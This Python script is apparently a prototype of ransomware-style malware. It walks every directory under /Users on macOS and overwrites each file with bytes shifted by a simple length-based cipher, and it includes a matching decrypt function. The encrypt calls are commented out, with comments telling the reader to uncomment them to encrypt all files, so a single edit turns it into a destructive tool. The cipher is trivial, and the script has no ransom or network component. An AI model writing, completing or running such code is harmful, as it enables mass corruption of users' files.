import os
import platform
def encrypt(filename):
    file = open(filename, "rb")
    byteArray = bytearray(file.read())
    
    f = lambda x : (x + len(byteArray) - 2)%256
    
    for i,v in enumerate(byteArray):
        byteArray[i] = f(v)
    file.close()

    writefile = open(filename, "wb")
    writefile.write(byteArray)
    writefile.close()

    return "successfully encrypted a file : " + filename

def decrypt(filename):
    file = open(filename, "rb")
    byteArray = bytearray(file.read())
    f = lambda x : (x - len(byteArray) + 2)%256
    writefile = open(filename, "wb")
    for i,v in enumerate(byteArray):
        byteArray[i] = f(v)

    file.close()

    writefile = open(filename, "wb")
    writefile.write(byteArray)
    writefile.close()


def findFile(c):
    ls = next(os.walk(c))
    files = []
    if len(ls) == 3:
        files = ls[2]
    elif len(ls) == 2: 
        files = ls[1]
    else:
        files = []
    for i in files:
        # uncomment below to start encrypt all files
        # encrypt(c+"/"+i)
        
        # uncomment below to start decrypt all files
        # decrypt(c+"/"+i)
        print("encrypting : "+i)
    if len(ls) > 1:
        dirs = ls[1]
        for i in dirs:
            if '.' not in i:
                try:
                    findFile(c+'/'+i)
                except:
                    print("")
    return ""


def main():
    operatingSystem = platform.platform().lower()
    if "macos" in operatingSystem:
        rootDir = "//Users"
        findFile(rootDir)


    elif "windows" in operatingSystem:
        print("not yet supported for windows")
    elif "linux" in operatingSystem:
        print("not yet supported for linux")
    return 0

if __name__ == "__main__":
    main()